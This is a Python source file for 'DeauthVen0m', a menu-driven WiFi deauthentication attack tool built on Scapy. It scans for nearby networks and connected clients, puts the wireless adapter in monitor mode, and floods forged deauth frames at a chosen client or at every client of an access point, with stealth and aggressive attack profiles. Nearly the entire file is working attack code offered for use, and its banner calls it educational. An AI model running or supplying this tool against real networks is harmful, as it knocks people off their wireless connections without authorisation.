from scapy.all import *
import os
import platform
import time
import threading
from colorama import Fore, Style, init
import pyfiglet
import logging

init(autoreset=True)

# Initialize logging
logging.basicConfig(filename="DeauthVen0m_debug.log", level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def show_banner():
    banner = pyfiglet.figlet_format("DeauthVen0m", font="slant")
    print(f"{Fore.RED}{banner}")
    print(f"{Fore.CYAN}WiFi Deauth Attack Tool by root0emir\n")
    print(f"{Fore.YELLOW}Use responsibly. This tool is for educational purposes only.\n")

scan_time = 20
deauth_packets = 1000
interval = 0.01
burst = 50
interface = None
networks = []
clients = []
vendor_cache = {}
logging_enabled = False

def load_vendor_info():
    global vendor_cache
    try:
        with open("mac-vendor.txt", "r") as f:
            for line in f:
                prefix, vendor = line.strip().split('\t')
                vendor_cache[prefix] = vendor
    except FileNotFoundError:
        if logging_enabled:
            logging.error("MAC Vendor info file not found. Proceeding without vendor info.")

def get_vendor(mac):
    prefix = mac.upper()[:8]
    return vendor_cache.get(prefix, "Unknown")

def list_network_adapters():
    adapters = []
    if platform.system() == "Windows":
        output = os.popen("netsh interface show interface").read()
        for line in output.splitlines():
            if "Dedicated" in line or "Wireless" in line:
                adapters.append(line.strip())
    elif platform.system() == "Linux" or platform.system() == "Darwin":
        output = os.popen("ifconfig -a").read()
        for line in output.splitlines():
            if "flags" in line or "ether" in line:
                adapters.append(line.strip())
    return adapters

def get_interface():
    global interface
    adapters = list_network_adapters()
    print(f"{Fore.GREEN}Available Network Adapters:")
    for i, adapter in enumerate(adapters):
        print(f"{i + 1}. {adapter}")
    choice = int(input(f"{Fore.YELLOW}Select the network adapter by number (or 'b' to go back): "))
    if choice == 'b':
        return
    choice -= 1
    if 0 <= choice < len(adapters):
        interface = adapters[choice].split()[-1]
        print(f"{Fore.GREEN}[+] Using interface: {interface}")
        if logging_enabled:
            logging.info(f"Using interface: {interface}")
    else:
        print(f"{Fore.RED}[!] Invalid selection.")
        if logging_enabled:
            logging.error("Invalid network adapter selection.")

def set_monitor_mode():
    if platform.system() == "Windows":
        print(f"{Fore.RED}[-] Monitor mode is not supported on Windows.")
        if logging_enabled:
            logging.error("Monitor mode is not supported on Windows.")
    elif platform.system() == "Darwin":
        print(f"{Fore.RED}[-] Monitor mode is not supported on macOS.")
        if logging_enabled:
            logging.error("Monitor mode is not supported on macOS.")
    else:
        os.system(f"ifconfig {interface} down")
        os.system(f"iwconfig {interface} mode monitor")
        os.system(f"ifconfig {interface} up")
        print(f"{Fore.GREEN}[+] {interface} set to monitor mode")
        if logging_enabled:
            logging.info(f"{interface} set to monitor mode")

def stop_monitor_mode():
    if platform.system() == "Windows":
        print(f"{Fore.RED}[-] Monitor mode is not supported on Windows.")
        if logging_enabled:
            logging.error("Monitor mode is not supported on Windows.")
    elif platform.system() == "Darwin":
        print(f"{Fore.RED}[-] Monitor mode is not supported on macOS.")
        if logging_enabled:
            logging.error("Monitor mode is not supported on macOS.")
    else:
        os.system(f"ifconfig {interface} down")
        os.system(f"iwconfig {interface} mode managed")
        os.system(f"ifconfig {interface} up")
        print(f"{Fore.GREEN}[+] {interface} set back to managed mode")
        if logging_enabled:
            logging.info(f"{interface} set back to managed mode")

def scan_networks():
    if not interface:
        print(f"{Fore.RED}[-] No wireless interface found. Please configure wireless interface settings first.")
        return
    print(f"{Fore.BLUE}[*] Scanning for networks on interface {interface} for {scan_time} seconds...")
    networks.clear()
    def packet_handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt[Dot11Elt].info.decode(errors="ignore")
            bssid = pkt[Dot11].addr2
            if (ssid, bssid) not in networks:
                networks.append((ssid, bssid))
                print(f"{Fore.YELLOW}[+] Network: SSID={ssid}, BSSID={bssid}")
                if logging_enabled:
                    logging.info(f"Network found: SSID={ssid}, BSSID={bssid}")
    try:
        sniff(iface=interface, timeout=scan_time, prn=packet_handler)
    except RuntimeError as e:
        print(f"{Fore.RED}[-] Error: {e}")
        if logging_enabled:
            logging.error(f"Error during network scan: {e}")

def scan_clients(target_bssid):
    if not interface:
        print(f"{Fore.RED}[-] No wireless interface found. Please configure wireless interface settings first.")
        return
    if not vendor_cache:
        load_vendor_info()
        if not vendor_cache:
            print(f"{Fore.RED}[-] MAC Vendor info file not found. Proceeding without vendor info.")
    print(f"{Fore.BLUE}[*] Scanning for clients on {target_bssid}...")
    clients.clear()
    def packet_handler(pkt):
        if pkt.haslayer(Dot11) and pkt.type == 2 and pkt.addr2 == target_bssid:
            client = pkt.addr1
            if client not in clients:
                vendor = get_vendor(client)
                clients.append((client, vendor))
                print(f"{Fore.CYAN}[+] Client: {client}, Vendor: {vendor}")
                if logging_enabled:
                    logging.info(f"Client found: {client}, Vendor: {vendor}")
    try:
        sniff(iface=interface, timeout=scan_time, prn=packet_handler)
    except RuntimeError as e:
        print(f"{Fore.RED}[-] Error: {e}")
        if logging_enabled:
            logging.error(f"Error during client scan: {e}")

def deauth_attack(target_bssid, client_bssid="FF:FF:FF:FF:FF:FF", packets=1000):
    if not interface:
        print(f"{Fore.RED}[-] No wireless interface found. Please configure wireless interface settings first.")
        return
    dot11 = Dot11(addr1=client_bssid, addr2=target_bssid, addr3=target_bssid)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    print(f"{Fore.RED}[*] Launching deauth attack on {target_bssid} -> {client_bssid}...")

    for i in range(0, packets, burst):
        sendp(packet, inter=interval, count=burst, iface=interface, verbose=0)
        
        if (i // burst + 1) % 100 == 0:
            print(f"{Fore.YELLOW}[+] Sent {(i // burst + 1) * burst} deauth packets so far...", flush=True)
            if logging_enabled:
                logging.info(f"Sent {(i // burst + 1) * burst} deauth packets so far...")

    print(f"{Fore.GREEN}[+] Deauth attack complete.")
    if logging_enabled:
        logging.info("Deauth attack complete.")
        
    time.sleep(1)
    
    print(f"{Fore.GREEN}[+] Deauth attack complete.")

def log_results():
    with open("DeauthVen0m_log.txt", "w") as f:
        for ssid, bssid in networks:
            f.write(f"SSID: {ssid}, BSSID={bssid}\n")
        f.write("\nClients:\n")
        for client, vendor in clients:
            f.write(f"Client MAC: {client}, Vendor: {vendor}\n")
    print(f"{Fore.GREEN}[*] Results saved to DeauthVen0m_log.txt")
    if logging_enabled:
        logging.info("Results saved to DeauthVen0m_log.txt")

def select_attack_profile():
    global scan_time, deauth_packets, interval, burst
    print("\n--- Attack Profiles ---")
    print("1. Stealth Mode: Low packets, high interval")
    print("2. Moderate Mode: Balanced settings")
    print("3. Aggressive Mode: High packets, low interval")
    print("b. Back to main menu")
    choice = input("Choose an attack profile: ")
    if choice == "1":
        scan_time = 20
        deauth_packets = 5000
        interval = 0.1
        burst = 5
    elif choice == "2":
        scan_time = 15
        deauth_packets = 7500
        interval = 0.1
        burst = 10
    elif choice == "3":
        scan_time = 10
        deauth_packets = 10000
        interval = 0.01
        burst = 50
    elif choice == "b":
        return
    else:
        print(f"{Fore.RED}[-] Invalid choice, using default settings.")
    if logging_enabled:
        logging.info(f"Attack profile selected: {choice}")

def configure_interface():
    global interface
    adapters = list_network_adapters()
    print(f"{Fore.GREEN}Available Network Adapters:")
    for i, adapter in enumerate(adapters):
        print(f"{i + 1}. {adapter}")
    choice = input(f"{Fore.YELLOW}Select the network adapter by number (or 'b' to go back): ")
    if choice == 'b':
        return
    choice = int(choice) - 1
    if 0 <= choice < len(adapters):
        interface = adapters[choice].split()[-1]
        print(f"{Fore.GREEN}[+] Using interface: {interface}")
        if logging_enabled:
            logging.info(f"Using interface: {interface}")
    else:
        print(f"{Fore.RED}[!] Invalid selection.")
        if logging_enabled:
            logging.error("Invalid network adapter selection.")

def configure_scan_time():
    global scan_time
    choice = input(f"{Fore.YELLOW}Enter new scan time in seconds (or 'b' to go back): ")
    if choice == 'b':
        return
    try:
        new_scan_time = int(choice)
        if new_scan_time > 0:
            scan_time = new_scan_time
            print(f"{Fore.GREEN}[+] Scan time set to: {scan_time} seconds")
            if logging_enabled:
                logging.info(f"Scan time set to: {scan_time} seconds")
        else:
            print(f"{Fore.RED}[-] Invalid scan time. Please enter a positive integer.")
    except ValueError:
        print(f"{Fore.RED}[-] Invalid input. Please enter a valid number.")

def main():
    global logging_enabled
    show_banner()

    while True:
        print(f"{Fore.GREEN}\n--- DeauthVen0m Menu ---")
        print(f"{Fore.CYAN}1. Scan Networks")
        print(f"{Fore.CYAN}2. Scan Clients on a Network")
        print(f"{Fore.CYAN}3. Launch Deauth Attack")
        print(f"{Fore.CYAN}4. Select Attack Profile")
        print(f"{Fore.CYAN}5. Configure Scan Time")
        print(f"{Fore.CYAN}6. Save Results and Exit")
        print(f"{Fore.CYAN}7. Enable/Disable Logging")
        print(f"{Fore.CYAN}8. Configure Wireless Interface")
        print(f"{Fore.CYAN}9. Exit")
        option = input(f"{Fore.YELLOW}Choose an option: ")

        if option == "1":
            scan_networks()

        elif option == "2":
            if not networks:
                print(f"{Fore.RED}[-] No networks found. Run a scan first.")
                if logging_enabled:
                    logging.warning("No networks found. Scan first.")
                continue
            print("Available Networks:")
            for i, net in enumerate(networks):
                print(f"{i + 1}. SSID: {net[0]}, BSSID={net[1]}")
            choice = input("Select network by number (or 'b' to go back): ")
            if choice == 'b':
                continue
            choice = int(choice) - 1
            if 0 <= choice < len(networks):
                target_bssid = networks[choice][1]
                scan_clients(target_bssid)
            else:
                print(f"{Fore.RED}[-] Invalid selection.")
                if logging_enabled:
                    logging.warning("Invalid network selection.")

        elif option == "3":
            if not networks:
                print(f"{Fore.RED}[-] No networks found. Run a scan first.")
                if logging_enabled:
                    logging.warning("No networks found. Scan first.")
                continue
            print("Available Networks:")
            for i, net in enumerate(networks):
                print(f"{i + 1}. SSID: {net[0]}, BSSID={net[1]}")
            choice = input("Select network by number (or 'b' to go back): ")
            if choice == 'b':
                continue
            choice = int(choice) - 1
            if 0 <= choice < len(networks):
                target_bssid = networks[choice][1]
                if clients:
                    print("Available Clients:")
                    for j, client in enumerate(clients):
                        print(f"{j + 1}. Client MAC: {client[0]}, Vendor: {client[1]}")
                    client_choice = input("Select client by number or press Enter to broadcast (or 'b' to go back): ")
                    if client_choice == 'b':
                        continue
                    client_choice = int(client_choice) - 1
                    if 0 <= client_choice < len(clients):
                        client_bssid = clients[client_choice][0]
                        packets = int(input(f"{Fore.YELLOW}Enter number of packets to send (default 1000): ") or "1000")
                        deauth_attack(target_bssid, client_bssid, packets)
                    else:
                        packets = int(input(f"{Fore.YELLOW}Enter number of packets to send (default 1000): ") or "1000")
                        deauth_attack(target_bssid, packets=packets)
                else:
                    print(f"{Fore.RED}[-] No clients found. Running deauth attack on all clients.")
                    packets = int(input(f"{Fore.YELLOW}Enter number of packets to send (default 1000): ") or "1000")
                    deauth_attack(target_bssid, packets=packets)
            else:
                print(f"{Fore.RED}[-] Invalid selection.")
                if logging_enabled:
                    logging.warning("Invalid network selection.")

        elif option == "4":
            select_attack_profile()

        elif option == "5":
            configure_scan_time()

        elif option == "6":
            log_results()
            break

        elif option == "7":
            logging_enabled = not logging_enabled
            status = "enabled" if logging_enabled else "disabled"
            print(f"{Fore.GREEN}[+] Logging {status}.")
            logging.info(f"Logging {status} by user.")

        elif option == "8":
            configure_interface()

        elif option == "9":
            print(f"{Fore.GREEN}[+] Exiting...")
            break

        else:
            print(f"{Fore.RED}[-] Invalid option. Try again.")
    
    stop_monitor_mode()

if __name__ == "__main__":
    main()
